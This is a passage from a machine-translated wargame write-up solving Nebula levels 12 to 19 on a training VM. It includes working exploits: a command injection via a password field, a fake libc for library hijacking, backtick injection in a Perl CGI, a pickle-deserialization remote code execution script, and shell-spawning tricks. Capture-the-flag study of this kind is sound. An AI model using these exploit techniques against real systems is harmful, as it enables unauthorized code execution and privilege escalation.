class="hljs-keyword">then</span></span> <span class="hljs-built_in"><span class="hljs-built_in">print</span></span>(<span class="hljs-string"><span class="hljs-string">"trying "</span></span> .. line) <span class="hljs-comment"><span class="hljs-comment">-- log from where ;\ local h = hash(line) if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then client:send("Better luck next time\n"); else client:send("Congrats, your token is 413**CARRIER LOST**\n") end end client:close() end</span></span></code> </pre> <br></div></div><br>  And so, again the lack of filtering of the entered data.  Add a comment: <br><br><pre> <code class="bash hljs">level12@nebula:~$ nc 127.0.0.1 50001 Password: 4754a4f4bd5787accd33de887b9250a0691dd198 <span class="hljs-comment"><span class="hljs-comment"># Congrats, your token is 413**CARRIER LOST**</span></span></code> </pre> <br>  Ok, it worked, let's try something else: <b>123;</b>  <b>getflag&gt; / tmp / flag12 #</b> <br><br><pre> <code class="bash hljs">level12@nebula:~$ nc 127.0.0.1 50001 Password: 123 ; getflag &gt; /tmp/flag12 <span class="hljs-comment"><span class="hljs-comment"># Better luck next time level12@nebula:~$ cat /tmp/flag12 You have successfully executed getflag on a target account level12@nebula:~$</span></span></code> </pre> <br><h3>  Level13 </h3><br>  Given the source, and most importantly cut out, not good: <br><br><div class="spoiler">  <b class="spoiler_title">level13_safe.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;string.h&gt; #define FAKEUID 1000 int main(int argc, char **argv, char **envp) { int c; char token[256]; if(getuid() != FAKEUID) { printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID); printf("The system administrators will be notified of this violation\n"); exit(EXIT_FAILURE); } // snip, sorry :) printf("your token is %s\n", token); }</span></span></span></span></code> </pre> <br></div></div><br>  Extract strings: <br><br><pre> <code class="bash hljs">level13@nebula:~$ strings /home/flag13/flag13 8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob your token is %s</code> </pre> <br>  Disassembling the application in <i>gdb</i> , we find an interesting line: <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">0x080485a2</span></span> &lt;+<span class="hljs-number"><span class="hljs-number">222</span></span>&gt;: <span class="hljs-keyword"><span class="hljs-keyword">xor</span></span> $0x5a,%edx</code> </pre> <br>  We have the line: <i>8mjomjh8wml; bwnh8jwbbnnwi;&gt;; 88? O; 9ob</i> , we have the key: <i>0x5a</i> , we have the operation: <i>xor</i> .  Send it to <i>Python</i> : <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span><span class="hljs-string"><span class="hljs-string">''</span></span>.join([chr(ord(x)^<span class="hljs-number"><span class="hljs-number">0x5a</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">'8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob'</span></span>]) &gt;&gt;&gt; <span class="hljs-string"><span class="hljs-string">'b705702b-76a8-42b0-8844-3adabbe5ac58'</span></span></code> </pre> <br>  And successfully pass authorization: <br><br><pre> <code class="bash hljs">level13@nebula:~$ su flag13 Password: b705702b-76a8-42b0-8844-3adabbe5ac58 sh-4.2$ id uid=986(flag13) gid=986(flag13) groups=986(flag13) sh-4.2$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level14 </h3><br>  There is a program that encrypts everything that goes to <i>STDIN</i> and sends it to <i>STDOUT</i> , and there is a token that we are asked to decrypt: <br><br><pre> <code class="bash hljs">level14@nebula:~$ cat /home/flag14/token 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.</code> </pre> <br>  Let's look at the algorithm in IDA: <br><br><img src="https://habrastorage.org/files/cb1/d1c/247/cb1d1c2471ca47bfb915b15bd430ca8d.PNG"><br><br>  Well, it's simple, 1 line in <i>Python</i> : <br><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">&gt;&gt;&gt; </span></span><span class="hljs-string"><span class="hljs-string">''</span></span>.join([chr(ord(a[i])-i) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(a))]) &gt;&gt;&gt; <span class="hljs-string"><span class="hljs-string">'8457c118-887c-4e40-a5a6-33a25353165\x0b'</span></span></code> </pre> <br>  Token with us, there is the last step: <br><br><pre> <code class="bash hljs">level14@nebula:~$ su - flag14 Password: 8457c118-887c-4e40-a5a6-33a25353165 flag14@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level15 </h3><br>  We are asked to see the <i>strace</i> command output for anomalies: <br><br><pre> <code class="bash hljs">level15@nebula:~$ strace /home/flag15/flag15</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">strace</b> <div class="spoiler_text">  execve ("/ home / flag15 / flag15", ["/ home / flag15 / flag15"], [/ * 18 vars * /]) = 0 <br>  brk (0) = 0x8d3a000 <br>  access ("/ etc / ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory) <br>  mmap2 (NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) = 0xb773b000 <br>  access ("/ etc / ld.so.preload", R_OK) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / i686 / sse2 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / i686 / sse2 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / i686 / sse2 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / i686 / sse2", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / i686 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / i686 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / i686 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / i686", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / sse2 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / sse2 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / sse2 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / sse2", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / tls / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / tls", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / i686 / sse2 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / i686 / sse2 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / i686 / sse2 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / i686 / sse2", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / i686 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / i686 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / i686 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / i686", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / sse2 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / sse2 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / sse2 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / sse2", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / cmov / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15 / cmov", 0xbf998584) = -1 ENOENT (No such file or directory) <br>  open ("/ var / tmp / flag15 / libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) <br>  stat64 ("/ var / tmp / flag15", {st_mode = S_IFDIR | 0775, st_size = 3, ...}) = 0 <br>  open ("/ etc / ld.so.cache", O_RDONLY) = 3 <br>  fstat64 (3, {st_mode = S_IFREG | 0644, st_size = 33815, ...}) = 0 <br>  mmap2 (NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7732000 <br>  close (3) = 0 <br>  access ("/ etc / ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory) <br>  open ("/ lib / i386-linux-gnu / libc.so.6", O_RDONLY) = 3 <br>  read (3, "\ 177ELF \ 1 \ 1 \ 1 \ 0 \ 0 \ 0 \ 0 \ 0 \ 0 \ 0 \ 0 \ 0 \ 3 \ 0 \ 3 \ 0 \ 1 \ 0 \ 0 \ 0p \ 222 \ 1 \ 0004 \ 0 \ 0 \ 0 "..., 512) = 512 <br>  fstat64 (3, {st_mode = S_IFREG | 0755, st_size = 1544392, ...}) = 0 <br>  mmap2 (NULL, 1554968, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3, 0) = 0x110000 <br>  mmap2 (0x286000, 12288, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_DENYWRITE, 3, 0x176) = 0x286000 <br>  mmap2 (0x289000, 10776, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0) = 0x289000 <br>  close (3) = 0 <br>  mmap2 (NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) = 0xb7731000 <br>  set_thread_area ({entry_number: -1 -&gt; 6, base_addr: 0xb77318d0, limit: 1048575, seg_32bit: 1, contents: 0, read_exec_only: 0, limit_in_pages: 1, seg_not_present: 0, useable: 1) = 0 <br>  mprotect (0x286000, 8192, PROT_READ) = 0 <br>  mprotect (0x8049000, 4096, PROT_READ) = 0 <br>  mprotect (0xae4000, 4096, PROT_READ) = 0 <br>  munmap (0xb7732000, 33815) = 0 <br>  fstat64 (1, {st_mode = S_IFCHR | 0620, st_rdev = makedev (136, 0), ...}) = 0 <br>  mmap2 (NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) = 0xb773a000 <br>  write (1, ‚Äústrace it! \ n‚Äù, 11strace it! <br>  ) = 11 <br>  exit_group (11) <br></div></div><br>  It is strange that the program tries to load from <i>/ var / tmp / flag15 /</i> .  Let's try to slip him his <i>libc.so.6</i> : <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), vo$ { execv("/bin/getflag", NULL); return 0; }</span></span></span></span></code> </pre> <br>  Compile and run: <br><br><pre> <code class="bash hljs">level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=vers,-Bstatic -o libc.so.6 fake_lib.c level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level16 </h3><br>  Another <i>Perl CGI</i> application that hangs on port 1616: <br><br><div class="spoiler">  <b class="spoiler_title">index.pl</b> <div class="spoiler_text"><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env perl use CGI qw{param}; print "Content-type: text/html\n\n"; sub login { $username = $_[0]; $password = $_[1]; $username =~ tr/az/AZ/; # conver to uppercase $username =~ s/\s.*//; # strip everything after a space @output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`; foreach $line (@output) { ($usr, $pw) = split(/:/, $line); if($pw =~ $password) { return 1; } } return 0; } sub htmlz { print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"); if($_[0] == 1) { print("Your login was accepted&lt;br/&gt;"); } else { print("Your login failed&lt;br/&gt;"); } print("Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n"); } htmlz(login(param("username"), param("password")));</span></span></code> </pre> <br></div></div><br>  The contents of $ username are first converted to upper case, and then sent to execution through the `` operator. <br><br>  Attempting to insert a command that would close the <i>egrep</i> was unsuccessful.  But we can try to bypass the upper case using the method from <a href="http://serverfault.com/questions/221318/bash-wildcard-expansion">this</a> article: <br><br><pre> <code class="bash hljs">level16@nebula:/tmp$ cat FLAG <span class="hljs-comment"><span class="hljs-comment">#!/bin/bash getflag &gt; /tmp/flag16log</span></span></code> </pre> <br>  Go to the browser link: <br><br><blockquote>  <a href="http://10.0.31.116/">10.0.31.116</a> : 1616 / index.cgi? Username = `/ * / FLAG` </blockquote><br>  And display our flag: <br><br><pre> <code class="bash hljs">level16@nebula:/tmp$ cat flag16log You have successfully executed getflag on a target account</code> </pre> <br><br><h3>  Level17 </h3><br>  As stated in the description: This script listens on port 10007 and has a vulnerability.  Very verbose. <br><br><div class="spoiler">  <b class="spoiler_title">level17.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import os import pickle import time import socket import signal signal.signal(signal.SIGCHLD, signal.SIG_IGN) def server(skt): line = skt.recv(1024) obj = pickle.loads(line) for i in obj: clnt.send("why did you send me " + i + "?\n") skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) skt.bind(('0.0.0.0', 10007)) skt.listen(10) while True: clnt, addr = skt.accept() if(os.fork() == 0): clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1])) server(clnt) exit(1)</span></span></code> </pre> <br></div></div><br>  But there is a vulnerability, it is in the line: <b>obj = pickle.loads (line)</b> .  Here you can learn more about its operation.  Let's write a script to execute the commands: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import socket import pickle host = '10.0.31.116' port = 10007 cmd = '''cos system (S'getflag &gt; /tmp/flag17' tR''' s = socket.socket() s.connect((host, port)) data = s.recv(1024) print(data) s.send(cmd) s.close()</span></span></code> </pre> <br>  After starting, we get <i>RCE</i> : <br><br><pre> <code class="bash hljs">$ ./flag17.py Accepted connection from 10.0.31.183:50700</code> </pre> <br><pre> <code class="bash hljs">level17@nebula:~$ cat /tmp/flag17 You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level18 </h3><br>  We are asked to analyze the source and find vulnerabilities.  Let's do it: <br><br><div class="spoiler">  <b class="spoiler_title">level18.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;fcntl.h&gt; #include &lt;getopt.h&gt; struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \ fprintf(globals.debugfile, __VA_ARGS__) #define PWFILE "/home/flag18/password" void login(char *pw) { FILE *fp; fp = fopen(PWFILE, "r"); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf("Unable to read password file %s\n", PWFILE); return; } fclose(fp); if(strcmp(pw, file) != 0) return; } dprintf("logged in successfully (with%s password file)\n", fp == NULL ? "out" : ""); globals.loggedin = 1; } void notsupported(char *what) { char *buffer = NULL; asprintf(&amp;buffer, "--&gt; [%s] is unsupported at this current time.\n", what); dprintf(what); free(buffer); } void setuser(char *user) { char msg[128]; sprintf(msg, "unable to set user to '%s' -- not supported.\n", user); printf("%s\n", msg); } int main(int argc, char **argv, char **envp) { char c; while((c = getopt(argc, argv, "d:v")) != -1) { switch(c) { case 'd': globals.debugfile = fopen(optarg, "w+"); if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg); setvbuf(globals.debugfile, NULL, _IONBF, 0); break; case 'v': globals.verbose++; break; } } dprintf("Starting up. Verbose level = %d\n", globals.verbose); setresgid(getegid(), getegid(), getegid()); setresuid(geteuid(), geteuid(), geteuid()); while(1) { char line[256]; char *p, *q; q = fgets(line, sizeof(line)-1, stdin); if(q == NULL) break; p = strchr(line, '\n'); if(p) *p = 0; p = strchr(line, '\r'); if(p) *p = 0; dvprintf(2, "got [%s] as input\n", line); if(strncmp(line, "login", 5) == 0) { dvprintf(3, "attempting to login\n"); login(line + 6); } else if(strncmp(line, "logout", 6) == 0) { globals.loggedin = 0; } else if(strncmp(line, "shell", 5) == 0) { dvprintf(3, "attempting to start shell\n"); if(globals.loggedin) { execve("/bin/sh", argv, envp); err(1, "unable to execve"); } dprintf("Permission denied\n"); } else if(strncmp(line, "logout", 4) == 0) { globals.loggedin = 0; } else if(strncmp(line, "closelog", 8) == 0) { if(globals.debugfile) fclose(globals.debugfile); globals.debugfile = NULL; } else if(strncmp(line, "site exec", 9) == 0) { notsupported(line + 10); } else if(strncmp(line, "setuser", 7) == 0) { setuser(line + 8); } } return 0; }</span></span></span></span></code> </pre> <br></div></div><br><ol><li>  void notsupported (char * what) -&gt; dprintf (what);  # And here is the format string vulnerability; </li><li>  void login (char * pw) -&gt; fp = fopen (PWFILE, "r");  # The file opens, but no one closes it. </li></ol><br>  Let's stop on the <i>login</i> function, especially as it is responsible for authorization.  Let's try to create a lot of file descriptors.  As a result, <i>fopen</i> should return <i>NULL</i> , and then judging by the code, the authorization flag will be set.  We will only need to run the <i>shell</i> : <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">'print("login me\n"*2000 +"closelog\nshell")'</span></span> | ./flag18 --init-file -d /dev/tty</code> </pre> <br>  We get a bunch of authorization messages, and the actual shell: <br><br><blockquote>  logged in successfully (without password file) <br>  ls <br>  flag18 password <br>  cat password <br>  44226113-d394-4f46-9406-91888128e27a <br>  getflag <br>  You have successfully executed get flag on a target account </blockquote><br><h3>  Level19 </h3><br>  In the description to the level it is said that there is an error in the program, and it should be searched for in runtime: <br><br><div class="spoiler">  <b class="spoiler_title">level19.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/stat.h&gt; int main(int argc, char **argv, char **envp) { pid_t pid; char buf[256]; struct stat statbuf; /* Get the parent's /proc entry, so we can verify its user id */ snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid()); /* stat() it */ if(stat(buf, &amp;statbuf) == -1) { printf("Unable to check parent process\n"); exit(EXIT_FAILURE); } /* check the owner id */ if(statbuf.st_uid == 0) { /* If root started us, it is ok to start the shell */ execve("/bin/sh", argv, envp); err(1, "Unable to execve"); } printf("You are unauthorized to run this program\n"); }</span></span></span></span></code> </pre> <br></div></div><br>  Judging by the code, it is necessary that the process be somehow started with UID = 0.  After some searches, we find <a href="https://www.ibm.com/developerworks/ru/library/au-unixprocess/">an article</a> from which we learn that if you create a <i>fork of a</i> process and then kill its <i>parent</i> , the system will automatically assign this fork of a new parent: a process with PID = 1 or the so-called init. <br><br>  In <i>Python</i> , the implementation of this approach is as follows: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import os, time def child(): print 'Child ', os.getpid() time.sleep(1) print "Running shell..." os.execv("/home/flag19/flag19", ('sh',)) def parent(): newpid = os.fork() if newpid == 0: child() else: pids = (os.getpid(), newpid) print "parent: %d, child: %d" % pids parent()</span></span></code> </pre><br>  After launch, we get the shell we need: <br><br><pre> <code class="bash hljs">level19@nebula:/home/flag19$ cat|python /tmp/flag19.py parent: 3828, child: 3829 Child 3829 Running shell... id uid=1020(level19) gid=1020(level19) euid=980(flag19) groups=980(flag19),1020(level19) getflag You have successfully executed getflag on a target account</code> </pre> <br>  That's all. </div><p>Source: <a href="https://habr.com/ru/post/319380/">https://habr.com/ru/post/319380/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../319366/index.html">Information security on mobile devices - consumer view</a></li>
<li><a href="../319368/index.html">Using Node.js technology as a platform for optimizing server capacity</a></li>
<li><a href="../319370/index.html">Electronics development: from idea to device</a></li>
<li><a href="../319374/index.html">VPS-digest: 30 useful materials on Habr√© and not only</a></li>
<li><a href="../319378/index.html">Powershell Practice: Monitoring Windows Backup Backup</a></li>
<li><a href="../319382/index.html">How PVS-Studio looks for errors: methods and technologies</a></li>
<li><a href="../319384/index.html">Direct disk access from python (simhdd)</a></li>
<li><a href="../319386/index.html">Modal windows and notifications in Angular</a></li>
<li><a href="../319388/index.html">BLE under the microscope 2</a></li>
<li><a href="../319392/index.html">Realistic UI: a realistic look at the Optimistic UI</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>